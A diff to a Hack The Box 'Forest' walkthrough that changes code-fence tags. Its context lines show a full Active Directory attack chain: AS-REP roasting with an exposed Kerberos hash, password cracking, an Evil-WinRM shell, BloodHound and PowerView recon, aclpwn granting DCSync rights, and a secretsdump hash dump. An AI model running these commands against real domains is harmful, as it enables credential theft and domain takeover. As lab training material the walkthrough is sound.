@@ -81,7 +81,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 500.27 seconds
 ```
 ## Impacket: GetADUsers.py
-```markdown
+```console
 root@test:~/tools/Windows/impacket/examples# python GetADUsers.py -all -dc-ip 10.10.10.161 htb.local/ | cut -d " " -f 1 |tee /root/HTB/Forest/users
 Impacket
 
@@ -122,7 +122,7 @@ santi
 jan
 ```
 ## Impacket: GetNPUsers.py
-```markdown
+```console
 root@test:~/tools/Windows/impacket/examples# python GetNPUsers.py htb.local/ -usersfile /root/HTB/Forest/users -dc-ip 10.10.10.161 -format hashcat -outputfile /root/HTB/Forest/hashes
 Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
 
@@ -163,12 +163,12 @@ Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
 [-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
 [-] User jan doesn't have UF_DONT_REQUIRE_PREAUTH set
 ```
-```markdown
+```console
 root@test:~/tools/Windows/impacket/examples# cat /root/HTB/Forest/hashes
 $krb5asrep$23$svc-alfresco@HTB.LOCAL:ead9ec2fc260fbda2f1697e3bd855564$c57e09ec984c5d72a66989c63b90c68eac5b309a4cb82890b4734dfc169c5f456ee9ef6ccc21d490d56a30ee0ed7cd13031b29f518d19a8a38780c64fe62f12db584b6f164cf47b9b2e2360983a16deebd8f43562a04edfa8bf5e9aeab56ae74eadec7df54845f4ce3b42609e36a222e56ac6ae23a2b4c8435d90ceb0d2c6526ccae1af3ea0e5d23003be8aefbbd407a4de36a35fb7056d06e503592a63878adbd9f80a979010a261ef397b55eae05daaeedb2ce3d2c8c6b21e815d8eeb4db5d4820b7ddccd44ad1c169828f6a95d16c68cca0c3cff32a08af39b917f9382bbe723e24e0df69
 ```
 ## John The Ripper
-```markdown
+```console
 root@test:~/tools/Windows/impacket/examples# john /root/HTB/Forest/hashes --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
@@ -182,7 +182,7 @@ Session completed
 ```
 
 ## Evil-WinRM
-```markdown
+```console
 root@test:~/tools/Windows/evil-winrm# ruby evil-winrm.rb -u svc-alfresco -p s3rvice -i 10.10.10.161
 
 Evil-WinRM shell v2.0
@@ -193,7 +193,7 @@ Info: Establishing connection to remote endpoint
 ```
 
 ## BloodHound
-```markdown
+```console
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload /root/tools/Windows/BloodHound/Ingestors/SharpHound.ps1
 Info: Uploading /root/tools/Windows/BloodHound/Ingestors/SharpHound.ps1 to C:\Users\svc-alfresco\Documents\SharpHound.ps1                                                                                   
 
@@ -221,7 +221,7 @@ Info: Downloading C:\Users\svc-alfresco\Documents\20200123011306_BloodHound.zip 
 
 Info: Download successful!
 ```
-```markdown
+```console
 root@test:/usr/share/neo4j/bin# neo4j start
 Active database: graph.db
 Directories in use:
@@ -246,7 +246,7 @@ root@test:/usr/share/neo4j/bin# bloodhound
 ![alt text](https://github.com/Zer0CodeX/Hack-The-Box/raw/master/BloodHound.png "BloodHound")
 
 ## ACLPwn.py
-```markdown
+```console
 root@test:~/HTB/Forest# aclpwn -f svc-alfresco -ft user -t 'HTB.LOCAL' -tt domain -d htb.local -dry[!] Unsupported operation: GenericAll on EXCH01.HTB.LOCAL (Computer)
 [-] Invalid path, skipping
 [+] Path found!
@@ -258,7 +258,7 @@ Path [1]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]->(SERVICE ACCOUNTS@HTB.LOCAL)-[Mem
 Please choose a path [0-1] 
 ```
 ##  PowerView
-```markdown
+```console
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload /root/tools/PowerSploit/Recon/PowerView.ps1
 Info: Uploading /root/tools/PowerSploit/Recon/PowerView.ps1 to C:\Users\svc-alfresco\Documents\PowerView.ps1                                                                                                
 
@@ -338,7 +338,7 @@ Info: Download successful!
 #### Shortest Path from Zer0Code to Domain Admins: 
 ![alt text](https://github.com/Zer0CodeX/Hack-The-Box/raw/master/BloodHound2.png "BloodHound")
 
-```markdown
+```console
 root@test:~/HTB/Forest# aclpwn -f zer0code -ft user -t 'HTB.LOCAL' -tt domain -d htb.local -dry
 [+] Path found!
 Path: (ZER0CODE@HTB.LOCAL)-[MemberOf]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]->(HTB.LOCAL)
@@ -346,7 +346,7 @@ Path: (ZER0CODE@HTB.LOCAL)-[MemberOf]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-
 [-] Modifying domain DACL to give DCSync rights to ZER0CODE
 ```
 
-```markdown
+```console
 root@test:~/HTB/Forest# aclpwn -f zer0code -ft user -t 'HTB.LOCAL' -tt domain -d htb.local -s 10.10.10.161
 Please supply the password or LM:NTLM hashes of the account you are escalating from: 
 [+] Path found!
@@ -359,7 +359,7 @@ Path: (ZER0CODE@HTB.LOCAL)-[MemberOf]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-
 ```
 
 ## Impacket: secretsdump.py
-```markdown
+```console
 root@test:~/tools/Windows/impacket/examples# python secretsdump.py -dc-ip 10.10.10.161 htb.local/zer0code:zerocode@10.10.10.161 -outputfile hashes.txt
 Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
 
